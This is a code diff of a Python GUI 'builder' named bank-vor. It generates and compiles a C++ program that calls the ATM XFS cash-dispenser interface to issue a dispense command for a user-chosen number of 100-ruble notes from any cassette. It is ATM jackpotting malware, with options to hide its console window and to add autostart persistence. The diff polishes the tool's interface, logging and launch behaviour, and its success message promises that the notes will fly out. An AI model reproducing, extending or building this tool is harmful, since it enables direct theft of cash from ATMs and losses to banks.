@@ -4,7 +4,7 @@ import os
 import subprocess
 import threading
 
-# --- Шаблон C++ (уже с авто-выбором кассеты) ---
+# --- Шаблон C++ (Авто-выбор кассеты с сотками) ---
 CPP_TEMPLATE = """
 #include <windows.h>
 
@@ -71,10 +71,9 @@ int main() {
         if (!opened) { FreeLibrary(hXfs); return -4; }
     }
 
-    // Команда: выдать N купюр с ЛЮБОЙ кассеты
     WFSCDMDISPENSE cmd;
     cmd.usNumber = 1; 
-    cmd.items[0].usNumber = %d; // Количество купюр
+    cmd.items[0].usNumber = %d; 
     cmd.items[0].usCashUnit = WFS_CDM_CASHUNIT_ANY; 
     cmd.bPresent = TRUE;
 
@@ -93,8 +92,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 class BuilderApp:
     def __init__(self, root):
         self.root = root
-        self.root.title("bank-vor | Regulator Edition")
-        self.root.geometry("500x560")
+        self.root.title("bank-vor | Final Edition")
+        self.root.geometry("500x520")
         self.root.configure(bg="#1e1e1e")
 
         style = ttk.Style()
@@ -103,13 +102,13 @@ class BuilderApp:
         style.configure("TButton", font=("Arial", 10, "bold"), padding=5)
         style.configure("Horizontal.TScale", background="#1e1e1e", troughcolor="#333")
         
-        tk.Label(root, text="BANK-VOR 100₽", font=("Arial", 20, "bold"), bg="#1e1e1e", fg="#00ff00").pack(pady=10)
+        tk.Label(root, text="BANK-VOR", font=("Arial", 22, "bold"), bg="#1e1e1e", fg="#00ff00").pack(pady=10)
 
         # РЕГУЛИРОВКА СУММЫ
         frame_slider = tk.Frame(root, bg="#1e1e1e")
-        frame_slider.pack(pady=10, fill="x", padx=20)
+        frame_slider.pack(pady=5, fill="x", padx=20)
         
-        ttk.Label(frame_slider, text="Регулировка суммы выдачи (только сотки):").pack(anchor="w")
+        ttk.Label(frame_slider, text="Сумма выдачи (сотками):").pack(anchor="w")
         
         self.slider_var = tk.IntVar(value=1000)
         self.slider = ttk.Scale(frame_slider, from_=100, to=5000, orient="horizontal", variable=self.slider_var, command=self.on_slide)
@@ -156,7 +155,7 @@ class BuilderApp:
         self.btn_run.pack(side=tk.LEFT, padx=5)
 
         # Лог
-        self.log_text = tk.Text(root, height=5, bg="#000", fg="#00ff00", font=("Consolas", 9))
+        self.log_text = tk.Text(root, height=7, bg="#000", fg="#00ff00", font=("Consolas", 9))
         self.log_text.pack(fill="both", expand=True, padx=20, pady=10)
 
         self.on_slide()
@@ -179,11 +178,15 @@ class BuilderApp:
     def run_via_cmd(self):
         fmt = self.format_var.get()
         exe_name = "bank-vor.exe" if fmt == "EXE" else "bank-vor.dll"
-        if not os.path.exists(exe_name):
-            messagebox.showerror("Ошибка", f"Файл {exe_name} не найден.")
+        exe_path = os.path.abspath(exe_name)
+        
+        if not os.path.exists(exe_path):
+            messagebox.showerror("Ошибка", f"Файл не найден:\n{exe_path}\nСначала собери его!")
             return
-        self.log(f"[*] Запуск {exe_name} через CMD...")
-        subprocess.Popen(f'start /wait cmd /c "{exe_name}"', shell=True)
+            
+        self.log(f"[*] Запуск: {exe_path}")
+        # /k оставляет окно открытым после выполнения, чтобы увидеть ошибки
+        subprocess.Popen(f'start cmd /k "{exe_path}"', shell=True)
 
     def start_build_thread(self):
         self.btn_build.config(state="disabled")
@@ -198,7 +201,6 @@ class BuilderApp:
             hide_cmd = "ShowWindow(GetConsoleWindow(), SW_HIDE);" if self.var_hide.get() else ""
             autostart_cmd = "SetAutoStart();" if self.var_autostart.get() else ""
             
-            # Передаем только 2 переменные (скрытие, автозапуск) и количество купюр
             code = CPP_TEMPLATE % (hide_cmd, autostart_cmd, count)
 
             with open("main.cpp", "w", encoding="utf-8") as f:
@@ -223,20 +225,20 @@ class BuilderApp:
                     cmd = f"g++ -O2 -static -shared main.cpp -o {out_name}"
 
             self.log(f"[*] Запуск компилятора: {compiler}")
-            process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            process = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='cp866', errors='ignore')
             
             if process.returncode == 0:
                 self.log(f"[+] УСПЕХ! Файл {out_name} собран.")
                 messagebox.showinfo("Успех", f"Файл {out_name} успешно собран!\nВылетит {count} купюр по 100₽.")
                 self.btn_run.config(state="normal")
             else:
-                err_text = process.stderr.lower()
+                err_text = (process.stderr or "").lower()
                 if "is not recognized" in err_text or "не является внутренней" in err_text:
                     self.log("[-] ОШИБКА: Компилятор не найден в системе!")
                     messagebox.showerror("Нет компилятора", f"Компилятор {compiler} не установлен.\nУстанови Visual Studio C++ Build Tools или MinGW.")
                 else:
                     self.log(f"[-] Ошибка сборки:\n{process.stderr}")
-                    messagebox.showerror("Ошибка", "Сборка не удалась. Проверь лог.")
+                    messagebox.showerror("Ошибка", "Сборка не удалась. Проверь лог внизу.")
 
         except Exception as e:
             self.log(f"[-] Ошибка: {str(e)}")
